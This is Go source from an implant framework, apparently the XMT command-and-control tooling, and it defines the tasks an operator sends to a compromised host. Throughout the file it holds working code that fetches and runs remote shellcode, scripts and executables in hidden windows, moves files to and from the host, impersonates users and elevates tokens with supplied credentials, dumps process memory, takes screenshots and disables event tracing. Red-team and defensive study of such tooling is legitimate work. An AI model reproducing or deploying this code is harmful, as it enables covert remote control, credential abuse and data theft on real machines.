package task

import (
	"context"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/iDigitalFlame/xmt/cmd"
	"github.com/iDigitalFlame/xmt/cmd/evade"
	"github.com/iDigitalFlame/xmt/cmd/filter"
	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/data"
	"github.com/iDigitalFlame/xmt/device"
	"github.com/iDigitalFlame/xmt/device/screen"
	"github.com/iDigitalFlame/xmt/man"
	"github.com/iDigitalFlame/xmt/util/bugtrack"
	"github.com/iDigitalFlame/xmt/util/text"
	"github.com/iDigitalFlame/xmt/util/xerr"
)

const timeout = time.Second * 15

const (
	taskIoDelete    uint8 = 0
	taskIoDeleteAll       = iota
	taskIoMove
	taskIoCopy
	taskIoTouch
	taskIoKill
	taskIoKillName
)

var client struct {
	sync.Once
	v *http.Client
}

var _ Callable = (*DLL)(nil)
var _ Callable = (*Zombie)(nil)
var _ Callable = (*Process)(nil)
var _ Callable = (*Assembly)(nil)
var _ backer = (*data.Chunk)(nil)
var _ backer = (*com.Packet)(nil)

type backer interface {
	WriteUint32Pos(int, uint32) error
}

// Callable is an internal interface used to specify a wide range of Runnabale
// types that can be Marshaled into a Packet.
//
// Currently the DLL, Zombie, Assembly and Process instances are supported.
type Callable interface {
	task() uint8
	MarshalStream(data.Writer) error
}

func (DLL) task() uint8 {
	return TvDLL
}
func initDefaultClient() {
	client.v = &http.Client{
		Transport: &http.Transport{
			Proxy:                 device.Proxy,
			DialContext:           (&net.Dialer{Timeout: timeout, KeepAlive: timeout, DualStack: true}).DialContext,
			MaxIdleConns:          64,
			IdleConnTimeout:       timeout,
			DisableKeepAlives:     true,
			ForceAttemptHTTP2:     false,
			TLSHandshakeTimeout:   timeout,
			ExpectContinueTimeout: timeout,
			ResponseHeaderTimeout: timeout,
		},
	}
}
func (Zombie) task() uint8 {
	return TvZombie
}
func (Process) task() uint8 {
	return TvExecute
}
func (Assembly) task() uint8 {
	return TvAssembly
}
func rawParse(r string) (*url.URL, error) {
	var (
		i   = strings.IndexRune(r, '/')
		u   *url.URL
		err error
	)
	if i == 0 && len(r) > 2 && r[1] != '/' {
		u, err = url.Parse("/" + r)
	} else if i == -1 || i+1 >= len(r) || r[i+1] != '/' {
		u, err = url.Parse("//" + r)
	} else {
		u, err = url.Parse(r)
	}
	if err != nil {
		return nil, err
	}
	if len(u.Host) == 0 {
		return nil, xerr.Sub("empty host field", 0xA)
	}
	if u.Host[len(u.Host)-1] == ':' {
		return nil, xerr.Sub("invalid port specified", 0xB)
	}
	if len(u.Scheme) == 0 {
		u.Scheme = com.NameHTTP
	}
	return u, nil
}
func request(u, a string, r *http.Request) (*http.Response, error) {
	client.Do(initDefaultClient)
	if len(a) > 0 {
		r.Header.Set(userAgent, text.Matcher(a).String())
	} else {
		r.Header.Set(userAgent, userValue)
	}
	var err error
	if r.URL, err = rawParse(u); err != nil {
		return nil, err
	}
	return client.v.Do(r)
}
func taskWait(x context.Context, r data.Reader, _ data.Writer) error {
	d, err := r.Int64()
	if err != nil {
		return err
	}
	if d <= 0 {
		return nil
	}
	t := time.NewTimer(time.Duration(d))
	select {
	case <-t.C:
	case <-x.Done():
	}
	t.Stop()
	return nil
}
func taskPull(x context.Context, r data.Reader, w data.Writer) error {
	var (
		u, a, p string
		err     = r.ReadString(&u)
	)
	if err != nil {
		return err
	}
	if err = r.ReadString(&a); err != nil {
		return err
	}
	if err = r.ReadString(&p); err != nil {
		return err
	}
	var (
		h, _ = http.NewRequestWithContext(x, http.MethodGet, "*", nil)
		o    *http.Response
	)
	if o, err = request(u, a, h); err != nil {
		return err
	}
	var (
		v = device.Expand(p)
		f *os.File
	)
	// 0x242 - CREATE | TRUNCATE | RDWR
	if f, err = os.OpenFile(v, 0x242, 0755); err != nil {
		o.Body.Close()
		return err
	}
	n, err := f.ReadFrom(o.Body)
	o.Body.Close()
	w.WriteString(v)
	w.WriteInt64(n)
	return err
}
func taskUpload(x context.Context, r data.Reader, w data.Writer) error {
	s, err := r.StringVal()
	if err != nil {
		return err
	}
	var (
		v = device.Expand(s)
		f *os.File
	)
	// 0x242 - CREATE | TRUNCATE | RDWR
	if f, err = os.OpenFile(v, 0x242, 0644); err != nil {
		return err
	}
	n := data.NewCtxReader(x, r)
	c, err := io.Copy(f, n)
	n.Close()
	f.Close()
	w.WriteString(v)
	w.WriteInt64(c)
	return err
}
func taskElevate(_ context.Context, r data.Reader, _ data.Writer) error {
	var f filter.Filter
	if err := f.UnmarshalStream(r); err != nil {
		return err
	}
	if f.Empty() {
		f = filter.Filter{Elevated: filter.True}
	}
	return device.Impersonate(&f)
}
func taskRevSelf(_ context.Context, _ data.Reader, _ data.Writer) error {
	return device.RevertToSelf()
}
func taskDownload(x context.Context, r data.Reader, w data.Writer) error {
	s, err := r.StringVal()
	if err != nil {
		return err
	}
	var (
		v = device.Expand(s)
		i os.FileInfo
	)
	if i, err = os.Stat(v); err != nil {
		return err
	}
	if w.WriteString(v); i.IsDir() {
		w.WriteBool(true)
		w.WriteInt64(0)
		return nil
	}
	w.WriteBool(false)
	w.WriteInt64(i.Size())
	// 0 - READONLY
	f, err := os.OpenFile(v, 0, 0)
	if err != nil {
		return err
	}
	n := data.NewCtxReader(x, f)
	_, err = io.Copy(w, n)
	n.Close()
	return err
}
func taskPullExec(x context.Context, r data.Reader, w data.Writer) error {
	var (
		u, a string
		z    bool
		err  = r.ReadString(&u)
	)
	if err != nil {
		return err
	}
	if err = r.ReadString(&a); err != nil {
		return err
	}
	if err = r.ReadBool(&z); err != nil {
		return err
	}
	var f *filter.Filter
	if err = filter.UnmarshalStream(r, &f); err != nil {
		return err
	}
	e, p, err := WebResource(x, w, z, a, u)
	if err != nil {
		if len(p) > 0 {
			os.Remove(p)
		}
		return err
	}
	e.SetParent(f)
	if err = e.Start(); err != nil {
		if len(p) > 0 {
			os.Remove(p)
		}
		return err
	}
	if !z {
		if w.WriteUint64(uint64(e.Pid()) << 32); len(p) > 0 {
			go func() {
				if bugtrack.Enabled {
					defer bugtrack.Recover("task.taskPullExec.func1()")
				}
				e.Wait()
				os.Remove(p)
			}()
		}
		return nil
	}
	i := e.Pid()
	if err = e.Wait(); len(p) > 0 {
		os.Remove(p)
	}
	if _, ok := err.(*cmd.ExitError); err != nil && !ok {
		return err
	}
	var (
		c, _ = e.ExitCode()
		s    = w.(backer)
		//     ^ This should NEVER panic!
	)
	s.WriteUint32Pos(0, i)
	s.WriteUint32Pos(4, uint32(c))
	return nil
}
func taskProcDump(_ context.Context, r data.Reader, w data.Writer) error {
	var f *filter.Filter
	if err := filter.UnmarshalStream(r, &f); err != nil {
		return err
	}
	return device.DumpProcess(f, w)
}
func taskSystemIo(x context.Context, r data.Reader, w data.Writer) error {
	t, err := r.Uint8()
	if err != nil {
		return err
	}
	switch w.WriteUint8(t); t {
	case taskIoKill:
		var i uint32
		if err = r.ReadUint32(&i); err != nil {
			return err
		}
		p, err1 := os.FindProcess(int(i))
		if err1 != nil {
			return err1
		}
		err = p.Kill()
		p.Release()
		return err
	case taskIoTouch:
		var n string
		if err = r.ReadString(&n); err != nil {
			return err
		}
		k := device.Expand(n)
		if _, err = os.Stat(k); err == nil {
			return nil
		}
		// 0x242 - CREATE | TRUNCATE | RDWR
		f, err1 := os.OpenFile(k, 0x242, 0644)
		if err1 != nil {
			return err1
		}
		f.Close()
		return nil
	case taskIoDelete:
		var n string
		if err = r.ReadString(&n); err != nil {
			return err
		}
		return os.Remove(device.Expand(n))
	case taskIoKillName:
		var n string
		if err = r.ReadString(&n); err != nil {
			return err
		}
		e, err1 := cmd.Processes()
		if err1 != nil {
			return err1
		}
		var p *os.Process
		for i := range e {
			if !strings.EqualFold(n, e[i].Name) {
				continue
			}
			if p, err = os.FindProcess(int(e[i].PID)); err != nil {
				break
			}
			err = p.Kill()
			if p.Release(); err != nil {
				break
			}
		}
		e, p = nil, nil
		return err
	case taskIoDeleteAll:
		var n string
		if err = r.ReadString(&n); err != nil {
			return err
		}
		return os.RemoveAll(device.Expand(n))
	case taskIoMove, taskIoCopy:
		var n, d string
		if err = r.ReadString(&n); err != nil {
			return err
		}
		if err = r.ReadString(&d); err != nil {
			return err
		}
		var (
			s, f *os.File
			k    = device.Expand(n)
			u    = device.Expand(d)
		)
		// 0 - READONLY
		if s, err = os.OpenFile(k, 0, 0); err != nil {
			return err
		}
		// 0x242 - CREATE | TRUNCATE | RDWR
		if f, err = os.OpenFile(u, 0x242, 0644); err != nil {
			s.Close()
			return err
		}
		v := data.NewCtxReader(x, s)
		c, err1 := io.Copy(f, v)
		v.Close()
		f.Close()
		w.WriteString(u)
		if w.WriteInt64(c); t == taskIoCopy {
			return err1
		}
		if err1 != nil {
			return err
		}
		return os.Remove(k)
	default:
		return xerr.Sub("invalid io operation", 0x34)
	}
}
func taskLoginUser(_ context.Context, r data.Reader, _ data.Writer) error {
	// NOTE(dij): This function is here and NOT in an OS-specific file as I
	//            hopefully will find a *nix way to do this also.
	var (
		u, d, p string
		err     = r.ReadString(&u)
	)
	if err != nil {
		return err
	}
	if err = r.ReadString(&d); err != nil {
		return err
	}
	if err = r.ReadString(&p); err != nil {
		return err
	}
	return device.ImpersonateUser(u, d, p)
}
func taskZeroTrace(_ context.Context, _ data.Reader, _ data.Writer) error {
	return evade.ZeroTraceEvent()
}
func taskScreenShot(_ context.Context, _ data.Reader, w data.Writer) error {
	return screen.Capture(w)
}

// WebResource will attempt to download the URL target at 'url' and parse the
// data into a Runnable interface.
//
// The supplied 'agent' string (if non-empty) will specify the User-Agent header
// string to be used.
//
// The passed Writer will be passed as Stdout/Stderr to certain processes if
// the 'z' flag is true.
//
// The returned string is the full expanded path if a temporary file is created.
// It's the callers responsibility to delete this file when not needed.
//
// This function uses the 'man.ParseDownloadHeader' function to assist with
// determining the executable type.
func WebResource(x context.Context, w data.Writer, z bool, agent, url string) (cmd.Runnable, string, error) {
	var (
		r, _   = http.NewRequestWithContext(x, http.MethodGet, "*", nil)
		o, err = request(url, agent, r)
	)
	if err != nil {
		return nil, "", err
	}
	b, err := io.ReadAll(o.Body)
	if o.Body.Close(); err != nil {
		return nil, "", err
	}
	if bugtrack.Enabled {
		bugtrack.Track("task.WebResource(): Download agent=%s, url=%s", agent, url)
	}
	var d bool
	switch man.ParseDownloadHeader(o.Header) {
	case 1:
		d = true
	case 2:
		if bugtrack.Enabled {
			bugtrack.Track("task.WebResource(): Download is shellcode url=%s", url)
		}
		return cmd.NewAsmContext(x, b), "", nil
	case 3:
		c := cmd.NewProcessContext(x, device.Shell, device.ShellArgs, string(b))
		if c.SetWindowDisplay(0); z {
			c.Stdout, c.Stderr = w, w
		}
		return c, "", nil
	case 4:
		c := cmd.NewProcessContext(x, device.PowerShell, pwsh, string(b))
		if c.SetWindowDisplay(0); z {
			c.Stdout, c.Stderr = w, w
		}
		return c, "", nil
	}
	var n string
	if d {
		n = execB
	} else if device.OS == device.Windows {
		n = execC
	} else {
		n = execA
	}
	f, err := os.CreateTemp("", n)
	if err != nil {
		return nil, "", err
	}
	n = f.Name()
	_, err = f.Write(b)
	if f.Close(); err != nil {
		return nil, n, err
	}
	if bugtrack.Enabled {
		bugtrack.Track("task.WebResource(): Download to tempfile url=%s, n=%s", url, n)
	}
	if os.Chmod(n, 0755); d {
		return cmd.NewDllContext(x, n), n, nil
	}
	c := cmd.NewProcessContext(x, n)
	if c.SetWindowDisplay(0); z {
		c.Stdout, c.Stderr = w, w
	}
	return c, n, nil
}
